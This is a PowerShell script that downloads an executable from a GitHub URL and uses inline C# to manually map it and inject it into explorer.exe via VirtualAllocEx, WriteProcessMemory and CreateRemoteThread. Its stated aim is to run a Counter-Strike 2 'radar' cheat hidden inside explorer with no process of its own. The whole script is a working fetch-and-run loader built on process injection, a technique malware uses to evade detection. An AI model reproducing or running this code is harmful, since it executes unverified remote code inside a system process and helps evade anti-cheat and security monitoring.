# ShellHost - inject radar into explorer (admin, CS2 running)
$ErrorActionPreference = 'Stop'
$url = 'https://raw.githubusercontent.com/anab1os/ShellHost/main/final.exe'
Write-Host '[*] download PE...'
$pe = (New-Object Net.WebClient).DownloadData($url)
Write-Host "[+] $($pe.Length) bytes"

$cs = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Inj {
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint n, out IntPtr w);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint f, out uint id);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);

    const uint PROCESS_ALL = 0x001F0FFF;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000;
    const uint PAGE_RWX = 0x40;

    public static int Run(byte[] pe) {
        int e_lfanew = BitConverter.ToInt32(pe, 0x3C);
        ushort nsec = BitConverter.ToUInt16(pe, e_lfanew + 6);
        ushort sizeOpt = BitConverter.ToUInt16(pe, e_lfanew + 20);
        int opt = e_lfanew + 24;
        if (BitConverter.ToUInt16(pe, opt) != 0x20B) throw new Exception("x64 only");
        ulong preferred = BitConverter.ToUInt64(pe, opt + 24);
        uint sizeOfImage = BitConverter.ToUInt32(pe, opt + 56);
        uint sizeOfHeaders = BitConverter.ToUInt32(pe, opt + 60);
        uint entryRVA = BitConverter.ToUInt32(pe, opt + 16);

        IntPtr loc = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);
        if (loc == IntPtr.Zero) throw new Exception("local alloc failed");
        Marshal.Copy(pe, 0, loc, (int)sizeOfHeaders);

        int sect = opt + sizeOpt;
        for (int i = 0; i < nsec; i++) {
            int off = sect + i * 40;
            uint va = BitConverter.ToUInt32(pe, off + 12);
            uint rs = BitConverter.ToUInt32(pe, off + 16);
            uint rp = BitConverter.ToUInt32(pe, off + 20);
            if (rs == 0 || rp == 0) continue;
            int copy = (int)Math.Min(rs, pe.Length - (int)rp);
            if (copy <= 0) continue;
            byte[] tmp = new byte[copy];
            Buffer.BlockCopy(pe, (int)rp, tmp, 0, copy);
            Marshal.Copy(tmp, 0, IntPtr.Add(loc, (int)va), copy);
        }

        ulong delta = (ulong)loc.ToInt64() - preferred;
        if (delta != 0) {
            uint relocRVA = BitConverter.ToUInt32(pe, opt + 152);
            uint relocSize = BitConverter.ToUInt32(pe, opt + 156);
            if (relocRVA != 0 && relocSize != 0) {
                int pos = (int)relocRVA;
                int end = (int)(relocRVA + relocSize);
                while (pos < end) {
                    uint pageRVA = (uint)Marshal.ReadInt32(IntPtr.Add(loc, pos));
                    uint blockSize = (uint)Marshal.ReadInt32(IntPtr.Add(loc, pos + 4));
                    if (blockSize < 8) break;
                    int cnt = (int)((blockSize - 8) / 2);
                    for (int j = 0; j < cnt; j++) {
                        ushort e = (ushort)Marshal.ReadInt16(IntPtr.Add(loc, pos + 8 + j * 2));
                        if ((e >> 12) == 10) {
                            IntPtr p = IntPtr.Add(loc, (int)pageRVA + (e & 0xFFF));
                            Marshal.WriteInt64(p, Marshal.ReadInt64(p) + (long)delta);
                        }
                    }
                    pos += (int)blockSize;
                }
            }
        }

        uint importRVA = BitConverter.ToUInt32(pe, opt + 120);
        if (importRVA != 0) {
            int desc = (int)importRVA;
            while (true) {
                uint nameRVA = (uint)Marshal.ReadInt32(IntPtr.Add(loc, desc + 12));
                if (nameRVA == 0) break;
                uint oft = (uint)Marshal.ReadInt32(IntPtr.Add(loc, desc));
                uint ft  = (uint)Marshal.ReadInt32(IntPtr.Add(loc, desc + 16));
                string dll = Marshal.PtrToStringAnsi(IntPtr.Add(loc, (int)nameRVA));
                IntPtr hMod = LoadLibrary(dll);
                uint thunk = oft != 0 ? oft : ft;
                int t = 0;
                while (true) {
                    long tv = Marshal.ReadInt64(IntPtr.Add(loc, (int)thunk + t));
                    if (tv == 0) break;
                    IntPtr fn;
                    if ((tv & unchecked((long)0x8000000000000000L)) != 0)
                        fn = GetProcAddress(hMod, "#" + (tv & 0xFFFF));
                    else
                        fn = GetProcAddress(hMod, Marshal.PtrToStringAnsi(IntPtr.Add(loc, (int)tv + 2)));
                    Marshal.WriteInt64(IntPtr.Add(loc, (int)ft + t), fn.ToInt64());
                    t += 8;
                }
                desc += 20;
            }
        }

        byte[] image = new byte[sizeOfImage];
        Marshal.Copy(loc, image, 0, (int)sizeOfImage);

        Process[] ex = Process.GetProcessesByName("explorer");
        if (ex.Length == 0) throw new Exception("explorer not found");
        int pid = ex[0].Id;
        IntPtr hProc = OpenProcess(PROCESS_ALL, false, pid);
        if (hProc == IntPtr.Zero) throw new Exception("OpenProcess failed - run as admin");

        IntPtr remote = VirtualAllocEx(hProc, loc, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);
        if (remote == IntPtr.Zero)
            throw new Exception("VirtualAllocEx at fixed base failed - restart explorer and retry");

        IntPtr written;
        if (!WriteProcessMemory(hProc, remote, image, sizeOfImage, out written))
            throw new Exception("WriteProcessMemory failed");

        IntPtr entry = IntPtr.Add(remote, (int)entryRVA);
        uint tid;
        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, entry, IntPtr.Zero, 0, out tid);
        if (hThread == IntPtr.Zero) throw new Exception("CreateRemoteThread failed");

        CloseHandle(hThread);
        CloseHandle(hProc);
        return pid;
    }
}
'@

Add-Type -TypeDefinition $cs -Language CSharp
try {
    $pidEx = [Inj]::Run($pe)
    Write-Host "[+] injected into explorer pid $pidEx"
    Write-Host '[*] no own process - radar inside explorer'
    Write-Host '[*] remove: Stop-Process -Name explorer -Force; Start-Process explorer'
} catch {
    Write-Host "[-] ERROR: $($_.Exception.Message)"
}
